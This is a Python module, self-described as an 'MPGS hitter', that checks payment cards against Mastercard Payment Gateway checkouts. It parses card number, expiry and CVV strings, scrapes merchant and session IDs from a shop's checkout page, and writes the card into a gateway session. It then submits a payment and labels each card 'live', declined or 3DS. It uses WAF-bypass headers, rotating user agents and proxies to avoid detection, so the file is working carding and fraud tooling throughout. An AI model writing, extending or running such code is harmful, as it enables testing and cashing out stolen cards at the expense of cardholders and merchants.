"""
MPGS (Mastercard Payment Gateway Services) hitter.
"""
import re
import json
import time
import random
import asyncio
import aiohttp
import base64
from typing import Optional, Dict, Any, Tuple
from urllib.parse import urlparse, urljoin

from .waf_solver import get_bypass_headers
from .curl_compat import create_connector

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
]

MPGS_ENDPOINTS = [
    "https://ap-gateway.mastercard.com",
    "https://eu-gateway.mastercard.com",
    "https://na-gateway.mastercard.com",
    "https://mtf.gateway.mastercard.com",  # Test
]


def parse_card(card_str: str) -> Optional[Tuple[str, str, str, str]]:
    parts = re.split(r'[|/\s]', card_str.strip())
    if len(parts) < 4:
        return None
    cc, mm, yy, cvv = parts[0], parts[1], parts[2], parts[3]
    if len(yy) == 4:
        yy = yy[2:]
    if not cc.isdigit() or len(cc) < 13:
        return None
    return cc, mm, yy, cvv


async def _get_mpgs_config(session: aiohttp.ClientSession, url: str, proxy: Optional[str]) -> Dict[str, Any]:
    """Extract MPGS merchant ID and API config from checkout page."""
    config = {"merchant_id": None, "session_id": None, "gateway_url": None, "version": "72"}
    try:
        headers = get_bypass_headers(url)
        async with session.get(url, headers=headers, proxy=proxy, timeout=aiohttp.ClientTimeout(total=20), allow_redirects=True) as resp:
            html = await resp.text(errors="ignore")

        # Merchant ID
        mid = re.search(r'merchant[_\s]?(?:Id|id|ID)["\s:\'=]+([A-Z0-9_\-]{6,})', html)
        if mid:
            config["merchant_id"] = mid.group(1)
        else:
            mid2 = re.search(r'"merchant"\s*:\s*"([^"]+)"', html)
            if mid2:
                config["merchant_id"] = mid2.group(1)

        # Session ID
        sess = re.search(r'"session(?:Id|ID)"\s*:\s*"([^"]+)"', html)
        if sess:
            config["session_id"] = sess.group(1)

        # Gateway URL
        for ep in MPGS_ENDPOINTS:
            if ep.replace("https://", "") in html:
                config["gateway_url"] = ep
                break

        # Version
        ver = re.search(r'version["\s:\']+v?(\d+)', html, re.IGNORECASE)
        if ver:
            config["version"] = ver.group(1)

    except Exception:
        pass
    return config


async def _create_mpgs_session(session: aiohttp.ClientSession, url: str, merchant_id: str, gateway_url: str, version: str, proxy: Optional[str]) -> Optional[str]:
    """Create a new MPGS payment session."""
    if not merchant_id or not gateway_url:
        return None

    session_url = f"{gateway_url}/api/rest/version/{version}/merchant/{merchant_id}/session"
    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    headers = {
        "User-Agent": random.choice(USER_AGENTS),
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": base,
        "Referer": url,
    }

    try:
        async with session.post(
            session_url,
            json={"session": {"authenticationLimit": 5}},
            headers=headers,
            proxy=proxy,
            timeout=aiohttp.ClientTimeout(total=20),
        ) as resp:
            if resp.status in (200, 201):
                data = await resp.json(content_type=None)
                return data.get("session", {}).get("id")
    except Exception:
        pass
    return None


async def hit_mpgs(url: str, card_str: str, proxy: Optional[str] = None) -> Dict[str, Any]:
    """Hit an MPGS-powered checkout page."""
    start = time.time()

    parsed_card = parse_card(card_str)
    if not parsed_card:
        return {"status": "error", "message": "Invalid card format", "gateway": "MPGS", "time_taken": 0}

    cc, mm, yy, cvv = parsed_card
    connector = create_connector()
    exp_year = int("20" + yy) if len(yy) == 2 else int(yy)

    async with aiohttp.ClientSession(connector=connector, cookie_jar=aiohttp.CookieJar(unsafe=True)) as session:
        config = await _get_mpgs_config(session, url, proxy)

        merchant_id = config.get("merchant_id")
        gateway_url = config.get("gateway_url") or MPGS_ENDPOINTS[0]
        version = config.get("version", "72")
        session_id = config.get("session_id")

        if not session_id:
            session_id = await _create_mpgs_session(session, url, merchant_id, gateway_url, version, proxy)

        if not session_id or not merchant_id:
            return {"status": "error", "message": "Could not initialize MPGS session", "gateway": "MPGS", "time_taken": round(time.time() - start, 2)}

        # Update session with card data
        parsed_url = urlparse(url)
        base = f"{parsed_url.scheme}://{parsed_url.netloc}"
        update_url = f"{gateway_url}/api/rest/version/{version}/merchant/{merchant_id}/session/{session_id}"

        update_payload = {
            "session": {
                "card": {
                    "number": cc,
                    "expiry": {
                        "month": mm.zfill(2),
                        "year": str(exp_year)[-2:],
                    },
                    "securityCode": cvv,
                }
            }
        }

        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Origin": base,
            "Referer": url,
        }

        try:
            async with session.put(
                update_url,
                json=update_payload,
                headers=headers,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=20),
            ) as resp:
                update_text = await resp.text(errors="ignore")
                update_status = resp.status

            # Now try to pay
            pay_url = urljoin(url, "/pay") if not url.endswith("/pay") else url
            pay_payload = {"session": {"id": session_id}}

            async with session.post(
                pay_url,
                json=pay_payload,
                headers=headers,
                proxy=proxy,
                timeout=aiohttp.ClientTimeout(total=30),
                allow_redirects=True,
            ) as resp:
                pay_text = await resp.text(errors="ignore")
                pay_status = resp.status

        except asyncio.TimeoutError:
            return {"status": "error", "message": "Request timed out", "gateway": "MPGS", "time_taken": round(time.time() - start, 2)}
        except Exception as e:
            return {"status": "error", "message": str(e)[:100], "gateway": "MPGS", "time_taken": round(time.time() - start, 2)}

    time_taken = round(time.time() - start, 2)
    result = _classify_mpgs_response(pay_text, pay_status, update_text)
    result["gateway"] = "MPGS"
    result["time_taken"] = time_taken
    return result


def _classify_mpgs_response(pay_text: str, pay_status: int, update_text: str) -> Dict[str, str]:
    lower = (pay_text + update_text).lower()

    try:
        pay_data = json.loads(pay_text)
        result_code = pay_data.get("result", "").upper()
        if result_code == "SUCCESS":
            return {"status": "live", "message": "Payment Successful ✅"}
        if result_code in ("FAILURE", "DECLINED"):
            reason = pay_data.get("error", {}).get("explanation", "Declined")
            return {"status": "decline", "message": f"{reason} ❌"}
        if result_code in ("PENDING", "REDIRECTED"):
            return {"status": "3ds", "message": "3DS Redirect Required 🔐"}
    except Exception:
        pass

    if any(k in lower for k in ["success", "approved", "authorised", "order_paid"]):
        return {"status": "live", "message": "Payment Approved ✅"}
    if any(k in lower for k in ["declined", "refused", "do not honor", "insufficient"]):
        return {"status": "decline", "message": "Card Declined ❌"}
    if "redirect" in lower or "3d" in lower or "authentication" in lower:
        return {"status": "3ds", "message": "3DS Required 🔐"}

    if pay_status in (200, 201):
        return {"status": "live", "message": "Processed ✅"}

    return {"status": "decline", "message": f"Unknown (HTTP {pay_status}) ⚠️"}
